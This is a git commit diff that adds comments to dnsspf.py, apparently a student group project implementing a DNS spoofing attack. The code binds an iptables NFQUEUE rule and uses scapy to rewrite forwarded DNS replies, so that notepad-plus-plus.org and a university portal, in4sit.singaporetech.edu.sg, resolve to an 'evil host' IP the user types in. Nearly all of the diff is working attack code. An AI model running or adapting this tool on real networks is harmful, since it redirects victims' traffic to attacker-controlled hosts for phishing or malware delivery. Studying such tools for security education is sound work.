bb7dc266efa01d6abf21baab05f771adb1797183
genaaaaa <2102744@sit.singaporetech.edu.sg>
2022-10-15 19:04:54 +0800

    Update dnsspf.py
    Adding comments

--- dnsspf.py
+++ dnsspf.py
@@ -21,45 +21,51 @@ class DnsSpoof:
         log.info("DNS Spoofing started.")
         print("\n[*] DNS spoofing in progress...")
         # create IP table rule to redirect packets to netfilterqueue
-        os.system(
-            f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueCount}')
-        self.queue.bind(self.queueCount, self.callBack)
+        os.system(f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueCount}')
+        # bind the queue number to our callback 'processPkt' and start it
+        self.queue.bind(self.queueCount, self.processPkt)
         try:
             self.queue.run()
         except KeyboardInterrupt:
             print("\n[!] Exiting DNS Spoof...")
             # remove IP table rule created
-            os.system(
-                f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueCount}')
+            os.system(f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueCount}')
             log.info("\n[+] IP table rule removed")
             print("\n[+] IP table rule removed...")
             print("\n[+] DNS Spoof exited\n")
-            bye = pyfiglet.figlet_format("P2 Group 13", font = "digital" )
+            bye = pyfiglet.figlet_format("P2 Group 13", font="digital")
             print(bye)
 
-    # new packet pass as argument
-    def callBack(self, packet):
+    # new packet pass as argument, netfilter queue object need a callback that is invoked whenever a packet is forwarded
+    def processPkt(self, packet):
+        # Convert netfilter queue packet to scapy packet
         scapyPkt = IP(packet.get_payload())
         if scapyPkt.haslayer(DNSRR):
+            # if the packet is a DNS Resource Record (DNS reply), modify it
             try:
-                log.info(f'[original] { scapyPkt[DNSRR].summary()}')
+                log.info(f'[original] {scapyPkt[DNSRR].summary()}')
                 queryName = scapyPkt[DNSQR].qname
                 if queryName in self.fakewebDict:
-                    scapyPkt[DNS].an = DNSRR(
-                        rrname=queryName, rdata=self.fakewebDict[queryName])
+                    # setting the rdata for the IP we want to redirect (spoofed)
+                    # for instance, notepad-plus-plus.org will be mapped to evil host
+                    scapyPkt[DNS].an = DNSRR(rrname=queryName, rdata=self.fakewebDict[queryName])
                     scapyPkt[DNS].ancount = 1
+                    # delete checksums and length of packet, because we have modified the packet
                     del scapyPkt[IP].len
                     del scapyPkt[IP].chksum
                     del scapyPkt[UDP].len
                     del scapyPkt[UDP].chksum
                     log.info(f'[modified] {scapyPkt[DNSRR].summary()}')
                 else:
-                    log.info(f'[not modified] { scapyPkt[DNSRR].rdata }')
+                    # if the website isn't in our record, don't modify
+                    log.info(f'[not modified] {scapyPkt[DNSRR].rdata}')
             except IndexError as error:
                 log.error(error)
                 print("\nError has been logged.")
+            # set back as netfilter queue packet
             packet.set_payload(bytes(scapyPkt))
         return packet.accept()
+
 
 # Display instructions
 def msg():
@@ -69,17 +75,18 @@ def msg():
     print("\nConfigure/insert domain name in fakewebDict [~line 74].")
     print("\nInput your IP address. \n")
 
+
 if __name__ == '__main__':
     msg()
     evilhost_ip = input("\nInput evil host IP: ")
     try:
+        # Define DNS dictionary
         fakewebDict = {
             b"notepad-plus-plus.org": evilhost_ip,
             b"in4sit.singaporetech.edu.sg": evilhost_ip
         }
         queueCount = 1
-        log.basicConfig(format='%(asctime)s - %(message)s',
-                        level = log.INFO)
+        log.basicConfig(format='%(asctime)s - %(message)s', level=log.INFO)
         spoof = DnsSpoof(fakewebDict, queueCount)
         spoof()
     except OSError as error:
